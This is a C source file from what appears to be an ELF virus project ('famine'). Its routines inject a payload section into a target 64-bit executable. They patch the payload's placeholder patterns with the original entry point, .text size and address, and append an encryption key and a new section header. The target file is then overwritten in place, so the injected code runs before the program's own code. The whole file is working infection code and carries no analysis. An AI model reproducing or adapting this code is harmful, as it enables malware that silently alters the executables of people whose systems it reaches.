#include "famine.h"

static void *find_pattern32(void *addr, size_t size, uint32_t pattern, uint8_t opcode_size) {
	if (size < sizeof(pattern))
		return (NULL);
	for (size_t i = 0; i < size - sizeof(pattern); i++) {
		if (*(uint32_t *)(addr + i) == pattern)
			return (addr + i + opcode_size);
	}
	return (NULL);
}

static	void *find_pattern64(void *addr, size_t size, uint64_t pattern, uint8_t opcode_size) {
	if (size < sizeof(pattern))
		return (NULL);
	for (size_t i = 0; i < size - sizeof(pattern); i++) {
		if (*(uint64_t *)(addr + i) == pattern)
			return (addr + i + opcode_size);
	}
	return (NULL);
}

void	save_new_section(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *shdr_last) {
	static char bytecode[] = BYTECODE;

	// Padding for BSS section
	if (shdr_last->sh_type == SHT_NOBITS) {
		size_t size_to_write = shdr_last->sh_size + woody->shdr_last_offset_adjustment;
		char padding_zero[4096];
		ft_memset(padding_zero, 0, sizeof(padding_zero));
		while (true) {
			if (size_to_write / sizeof(padding_zero) < 1) {
				if (syscall_wrapper(__NR_write, new_bin_fd, padding_zero, size_to_write) == -1) {
					ERROR_SYS("write");
					exit_clean(woody, EXIT_FAILURE);
				}
				break ;
			}
			if (syscall_wrapper(__NR_write, new_bin_fd, padding_zero, sizeof(padding_zero)) == -1) {
				ERROR_SYS("write");
				exit_clean(woody, EXIT_FAILURE);
			}
			size_to_write -= sizeof(padding_zero);
		}
	}

	void *addr_pattern;
	// Write old entry
	addr_pattern = find_pattern32((void *)bytecode, BYTECODE_SIZE, PATTERN_ENTRY_OLD, PATTERN_ENTRY_OLD_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR("old entry pattern not found");
		exit_clean(woody, EXIT_FAILURE);
	}
	*(int32_t *)addr_pattern = woody->ehdr.e_entry - (woody->new_entry  + (size_t)(addr_pattern - (void *)bytecode) + sizeof(PATTERN_ENTRY_OLD));

	// Write key size
	addr_pattern = find_pattern64((void *)bytecode, BYTECODE_SIZE, PATTERN_KEY_SIZE, PATTERN_KEY_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR("key size pattern not found");
		exit_clean(woody, EXIT_FAILURE);
	}
	*(uint64_t *)addr_pattern = woody->key.length;


	// Write text section size
	Elf64_Shdr	shdr_text;
	uint16_t	index_shdr_text;
	index_shdr_text = get_index_section_with_name(woody, ".text");
	if (index_shdr_text == (uint16_t)-1) {
		ERROR(".text section not found");
		exit_clean(woody, EXIT_FAILURE);
	}
	read_section_header(woody, index_shdr_text, &shdr_text);
	addr_pattern = find_pattern64((void *)bytecode, BYTECODE_SIZE, PATTERN_TEXT_SIZE, PATTERN_TEXT_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR(".text size pattern not found");
		exit_clean(woody, EXIT_FAILURE);
	}
	*(uint64_t *)addr_pattern = shdr_text.sh_size;

	// Write text entry
	addr_pattern = find_pattern32((void *)bytecode, BYTECODE_SIZE, PATTERN_ENTRY_TEXT, PATTERN_ENTRY_TEXT_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR(".text entry pattern not found");
		exit_clean(woody, EXIT_FAILURE);
	}
	*(int32_t *)addr_pattern = shdr_text.sh_addr - (woody->new_section.sh_addr + (size_t)(addr_pattern - (void *)bytecode) + sizeof(PATTERN_ENTRY_OLD));


	// Write instructions
	if (syscall_wrapper(__NR_write, new_bin_fd, bytecode, BYTECODE_SIZE) == -1) {
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}

	// Write key
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->key.raw, woody->key.length) == -1) {
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}
}

void	save_new_shdr(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *new_section) {
	write_uint32(woody, &new_section->sh_type, new_section->sh_type);
	write_uint64(woody, &new_section->sh_flags, new_section->sh_flags);
	write_uint64(woody, &new_section->sh_addr, new_section->sh_addr);
	write_uint64(woody, &new_section->sh_offset, new_section->sh_offset);
	write_uint64(woody, &new_section->sh_size, new_section->sh_size);
	write_uint64(woody, &new_section->sh_addralign, new_section->sh_addralign);

	if (syscall_wrapper(__NR_write, new_bin_fd, new_section, sizeof(Elf64_Shdr)) == -1) {
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}
}

void	save_new_elf_file(struct s_woody *woody, Elf64_Shdr *shdr_last, uint16_t index_shdr_last) {
	int	new_bin_fd;
	size_t	written_map_bytes = 0;

	new_bin_fd = syscall_wrapper(__NR_open, woody->target, O_WRONLY | O_TRUNC);
	if (new_bin_fd == -1) {
		ERROR_SYS("open");
		exit_clean(woody, EXIT_FAILURE);
	}

	size_t size_to_write_before_decrypter = shdr_last->sh_offset - woody->shdr_last_offset_adjustment + (shdr_last->sh_type != SHT_NOBITS ? shdr_last->sh_size : 0);
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map, size_to_write_before_decrypter) == -1) { // FIRST PART
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}
	written_map_bytes += size_to_write_before_decrypter;
	save_new_section(woody, new_bin_fd, shdr_last); // Write new section + .bss padding
	size_t size_to_write_before_new_shdr = (woody->ehdr.e_shoff + woody->ehdr.e_shentsize * (index_shdr_last + 1)) - written_map_bytes;
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map + written_map_bytes, size_to_write_before_new_shdr) == -1) { // SECOND PART
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}
	written_map_bytes += size_to_write_before_new_shdr;
	save_new_shdr(woody, new_bin_fd, &woody->new_section); // Write new shdr
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map + written_map_bytes, woody->bin_st.st_size - written_map_bytes) == -1) { // THIRD PART
		ERROR_SYS("write");
		exit_clean(woody, EXIT_FAILURE);
	}
}
